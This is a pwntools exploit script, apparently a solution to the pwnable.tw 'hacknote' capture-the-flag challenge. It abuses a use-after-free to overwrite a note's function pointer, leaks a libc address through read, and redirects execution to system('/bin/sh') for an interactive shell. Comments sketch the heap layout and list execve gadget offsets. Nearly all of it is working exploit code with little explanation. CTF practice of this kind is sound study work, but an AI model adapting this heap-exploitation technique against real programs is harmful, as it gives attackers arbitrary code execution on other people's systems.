#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('hacknote')
libc = ELF('libc_32.so.6')
# ELF('libc_32.so.6')
index = 0
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('chall.pwnable.tw', 10102)  
    # process(elf.path)

def malloc(note_size, content):
    global index
    io.sendafter(b':', '1')
    io.sendafter(b':', str(note_size))
    io.sendafter(b':', content)
    index+=1
    return index-1

def free(ind):
    io.sendafter(b':', '2')
    io.sendafter(b':', str(ind))

    
def puts(index):
    io.sendafter(b':', '3')
    io.sendafter(b':', str(index))

'''
struct Note {
    void (int*)(int functionPtr); // offset
    char *str; // offset + 4
}
void FUN_0804862b(int param_1)
{
  puts(*(char **)(param_1 + 4));
  return;
}
allocating 32 and then entering 'a'*8 and 
then allocating 32 and then entering 'b'*8
0x804b198:      0x00000000      0x00000011      0x0804862b      0x0804b1b0 -> char* to "aaaa\n"
0x804b1a8:      0x00000000      0x00000031      0x61616161      0x0000000a

0x804b1d8:      0x00000000      0x00000011      0x0804862b      0x0804b1f0 -> char* to "bbbb\n"
0x804b1e8:      0x00000000      0x00000031      0x62626262      0x0000000a
struct of size 16: 2 pointers of 8 bytes
The exploit is
    A          B
|  16(0)   |  16(1)    |
|ptr(2)|
then the next malloc overwrites the function pointer
of chunk A
choosing option 3 for chunk A executes the function pointer
'''
##############################
io = start()
a = malloc(16, b'a'*4)
b = malloc(16, b'b'*4)
# overwrite function pointer via use-after-free
free(a)
free(b)
# overwrites function pointer to call print on read
# to get libc leak
malloc(8, p32(0x0804862b)+p32(elf.sym['read']))
# trigger the function pointer1
puts(0)
# libc read 000d41c0
offset = u32(io.recv(4)) - 0x000d41c0
log.info(f'Libc offset: {hex(offset)}')
free(2)
malloc(8, p32(0x0003a940+offset)+ p32(offset+0x158e8b))
puts(0)
io.interactive()
##############################
'''
0x3a819 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f065 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f066 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''